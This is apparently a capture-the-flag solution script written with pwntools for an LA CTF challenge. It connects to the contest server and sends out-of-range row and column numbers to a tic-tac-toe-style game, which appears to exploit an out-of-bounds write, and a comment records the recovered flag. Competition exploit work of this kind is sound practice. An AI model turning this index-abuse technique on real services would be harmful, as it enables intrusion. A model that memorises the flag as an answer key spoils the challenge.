#!/usr/bin/python3
from pwn import *


# Edit these placeholders: ./chall ./libc.so.6 amd64
context.binary = exe = ELF("./chall")
# libc = ELF("./libc.so.6")
context.arch = "amd64"


script = '''
b*main+116
c
'''
# p = gdb.debug(exe.path , gdbscript = script)
p = remote("chall.lac.tf" , port = 30001)


def slog(name , addr): return success(": ".join([name , hex(addr)]))
def s(payload):
    sleep(1.5)
    p.send(payload)
def sl(payload):
    sleep(1.5)
    p.sendline(payload)
def sa(info , payload):
    p.sendafter(info , payload)
def sla(info , payload):
    p.sendlineafter(info , payload)
def ru(payload):
    return p.recvuntil(payload)
def rn(payload):
    return p.recvn(payload)
def rln():
    return p.recvline()

def mov(x , y):
    sla(b'Enter row #(1-3): ' , str(x))
    sla(b'Enter column #(1-3): ' , str(y))

mov(1 , -22)
mov(6 , 2)
mov(6 , 3)

# lactf{th3_0nly_w1nn1ng_m0ve_1s_t0_p1ay}

p.interactive()